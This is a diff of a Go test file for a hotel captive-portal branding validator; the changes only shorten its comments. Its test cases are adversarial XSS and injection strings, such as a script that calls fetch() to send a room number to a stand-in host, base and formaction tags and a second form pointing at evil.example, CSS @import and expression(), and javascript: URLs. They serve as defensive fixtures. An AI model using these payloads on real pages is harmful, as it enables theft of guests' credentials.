@@ -1,14 +1,8 @@
 package main
 
-// THE PORTAL BRANDING ESCAPE HATCH, HELD TO THE ONE RULE THAT MATTERS.
-//
-// Operators can supply custom CSS and HTML so a hotel can look like itself. The page they are customising is
-// a CAPTIVE PORTAL: it collects room numbers, surnames, reservation numbers and voucher codes. Executable
-// content injected into it can read every one of those and post them anywhere.
-//
-// So the validator REFUSES rather than sanitises, and these tests are the specification of what it refuses.
-// They are deliberately adversarial: each case is a way a real attempt would be spelled, not a single
-// canonical "<script>" that any naive check would catch.
+// Custom CSS/HTML goes into a captive portal that collects room numbers, surnames and voucher codes, so
+// executable content could exfiltrate them. The validator refuses rather than sanitises; the cases are
+// adversarial spellings, not just a canonical "<script>".
 
 import (
 	"encoding/json"
@@ -23,8 +17,7 @@ import (
 func TestBrandingRefusesExecutableContent(t *testing.T) {
 	for _, tc := range []struct{ name, field, value string }{
 		{"a plain script tag", "custom_html", `<script>fetch('//x/'+document.forms[0].room.value)</script>`},
-		// Spellings the old regular-expression denylist let through. Each is refused now because the fragment
-		// is parsed and rebuilt from an allowlist, not because somebody thought of it.
+		// The fragment is parsed and rebuilt from an allowlist, so these are refused without anyone anticipating them.
 		{"an onerror handler with no whitespace", "custom_html", `<img/onerror=alert(1) src=x>`},
 		{"a base element re-pointing the forms", "custom_html", `<base href="https://evil.example/">`},
 		{"a button re-targeting the voucher form", "custom_html", `<button form="form-voucher" formaction="https://evil.example/">Go</button>`},
@@ -41,8 +34,7 @@ func TestBrandingRefusesExecutableContent(t *testing.T) {
 		{"a javascript: URL", "custom_html", `<a href="javascript:steal()">Help</a>`},
 		{"an iframe", "custom_html", `<iframe src="//evil.example"></iframe>`},
 		{"an object", "custom_html", `<object data="//evil.example"></object>`},
-		// A SECOND FORM THAT COLLECTS CREDENTIALS is the subtlest of these: it looks like markup, contains no
-		// script at all, and posts the guest's room number wherever it likes.
+		// A second form has no script yet posts the guest's room number anywhere.
 		{"a second form", "custom_html", `<form action="//evil.example"><input name="room"></form>`},
 		{"css @import", "custom_css", `@import url("//evil.example/x.css");`},
 		{"css expression", "custom_css", `body { width: expression(alert(1)); }`},
@@ -53,8 +45,6 @@ func TestBrandingRefusesExecutableContent(t *testing.T) {
 			if err == nil {
 				t.Fatalf("%s was ACCEPTED into a page that collects guest credentials", tc.name)
 			}
-			// The refusal must say why, because an operator who cannot tell what was rejected will try again
-			// with the same thing spelled differently.
 			if len(err.Error()) < 20 {
 				t.Errorf("the refusal does not explain itself: %q", err)
 			}
@@ -63,8 +53,6 @@ func TestBrandingRefusesExecutableContent(t *testing.T) {
 }
 
 func TestBrandingAcceptsOrdinaryCustomisation(t *testing.T) {
-	// The hatch has to be usable, or operators will ask for something worse. Real styling and real markup
-	// must pass.
 	ok := map[string]any{
 		"hotel_name":       "Semantics Demo Hotel",
 		"brand_color":      "#0f6b63",
@@ -83,8 +71,7 @@ func TestBrandingAcceptsOrdinaryCustomisation(t *testing.T) {
 }
 
 func TestBrandingRefusesAssetsFromAnywhere(t *testing.T) {
-	// A logo is fetched by the guest's browser. Allowing plain http would let anyone on the path replace the
-	// hotel's logo, and allowing an arbitrary scheme is how javascript: gets back in through a URL field.
+	// Plain http would let anyone on the path replace the logo; an arbitrary scheme lets javascript: in via a URL field.
 	for _, bad := range []string{
 		"http://evil.example/logo.png",
 		"javascript:alert(1)",
@@ -103,7 +90,7 @@ func TestBrandingRefusesAssetsFromAnywhere(t *testing.T) {
 }
 
 func TestBrandingRefusesAColourThatIsNotAColour(t *testing.T) {
-	// brand_color is interpolated into a style property. "anything the browser accepts" includes url().
+	// brand_color is interpolated into a style property, where anything the browser accepts includes url().
 	for _, bad := range []string{"url(javascript:alert(1))", "red; background: url(//x)", "#ggg", "expression(1)"} {
 		if err := validateDesign(map[string]any{"brand_color": bad}); err == nil {
 			t.Errorf("brand_color %q was accepted", bad)
@@ -117,7 +104,6 @@ func TestBrandingRefusesAColourThatIsNotAColour(t *testing.T) {
 }
 
 func TestBrandingBoundsTheTemplateSize(t *testing.T) {
-	// The document is read on every portal load. An operator pasting a megabyte of CSS should be told so.
 	big := make([]byte, 70*1024)
 	for i := range big {
 		big[i] = 'a'
@@ -127,12 +113,7 @@ func TestBrandingBoundsTheTemplateSize(t *testing.T) {
 	}
 }
 
-// THE STEP-UP GUARDS THE SURFACE IT WAS WRITTEN FOR.
-//
-// Publishing used to require a password for every change, which meant a receptionist correcting a typo in the
-// hotel's name met the same challenge as somebody injecting CSS into the page that collects voucher codes.
-// The check is now on the boundary that matters, and these assert the line is drawn by CONTENT rather than by
-// which screen the request came from.
+// The step-up line is drawn by content (advanced fields), not by which screen the request came from.
 func TestOnlyAdvancedContentTriggersTheStepUp(t *testing.T) {
 	current := map[string]any{
 		"hotel_name": "Semantics Demo Hotel", "brand_color": "#0f6b63",
@@ -146,8 +127,7 @@ func TestOnlyAdvancedContentTriggersTheStepUp(t *testing.T) {
 		{"renaming the hotel", map[string]any{"hotel_name": "Semantics Demo Resort", "custom_css": ".card { box-shadow: none; }"}, false},
 		{"changing a colour", map[string]any{"hotel_name": "Semantics Demo Hotel", "brand_color": "#123456", "custom_css": ".card { box-shadow: none; }"}, false},
 		{"editing the stylesheet", map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".card { display: none; }"}, true},
-		// REMOVING it counts too. "Advanced is empty now" is still a change to what the page executes, and a
-		// rule that only looked at the new value would let a session clear the hotel's own styling unchallenged.
+		// Removing counts too: a rule that only looked at the new value would let a session clear styling unchallenged.
 		{"clearing the stylesheet", map[string]any{"hotel_name": "Semantics Demo Hotel"}, true},
 		{"adding markup", map[string]any{"custom_css": ".card { box-shadow: none; }", "custom_html": "<p>hi</p>"}, true},
 	} {
@@ -158,9 +138,7 @@ func TestOnlyAdvancedContentTriggersTheStepUp(t *testing.T) {
 }
 
 func TestSavingSettingsStillRefusesScript(t *testing.T) {
-	// The step-up decides WHO may change the escape hatch. validateDesign decides WHAT may go in it, and the
-	// settings door must run it exactly as publish does -- a second way in that skipped validation would be a
-	// way to put script on the sign-in page.
+	// The settings path must run validateDesign exactly as publish does, or it is a second way to put script on the sign-in page.
 	for _, bad := range []map[string]any{
 		{"custom_html": "<script>steal()</script>"},
 		{"custom_html": "<img src=x onerror=steal()>"},
@@ -175,16 +153,13 @@ func TestSavingSettingsStillRefusesScript(t *testing.T) {
 }
 
 func TestThePreviewReadsTheRealPortal(t *testing.T) {
-	// A preview drawn separately in the admin would agree with the portal on the day it was written and drift
-	// from then on. This pins it to portald's own page rather than to a copy.
+	// A separately drawn preview would drift from the portal; pin it to portald's own page.
 	if portalPreviewURL != "http://127.0.0.1:8380/" {
 		t.Errorf("the preview source is %q; it must be the portal's own sign-in page on this appliance", portalPreviewURL)
 	}
 }
 
-// "< script >" IS TEXT TO A BROWSER, and it used to be refused as if it were a tag. What matters is what the
-// guest's browser would do with it, so the assertion is now the stronger one: it reaches the page only as
-// escaped text, never as markup.
+// "< script >" is text to a browser; it must reach the page only as escaped text, never as markup.
 func TestTextThatLooksLikeATagReachesTheGuestAsText(t *testing.T) {
 	g := portaldesign.ForGuests(map[string]any{"custom_html": "< script >alert(1)</ script >"})
 	h, _ := g["custom_html"].(string)
@@ -194,7 +169,6 @@ func TestTextThatLooksLikeATagReachesTheGuestAsText(t *testing.T) {
 }
 
 func TestTermsURLIsValidated(t *testing.T) {
-	// It became a live link on the sign-in page without any check at all.
 	for _, bad := range []string{"javascript:alert(1)", "http://hotel.example/terms", "//evil.example/terms"} {
 		if err := validateDesign(map[string]any{"terms_url": bad}); err == nil {
 			t.Errorf("terms_url %q was accepted", bad)
@@ -224,8 +198,7 @@ func TestTextAndTemplateFieldsAreBounded(t *testing.T) {
 	}
 }
 
-// CHOOSING A TEMPLATE IS NOT ADVANCED. Ordinary branding saves with no password; custom CSS and HTML need it in
-// both directions. Template choice and its options are closed vocabularies, so they must not trip it.
+// Template choice and options are closed vocabularies and must not trigger the step-up; custom CSS/HTML does.
 func TestTemplateChoiceDoesNotTriggerTheStepUp(t *testing.T) {
 	current := map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".a{}"}
 	next := map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".a{}", "template_id": "split",
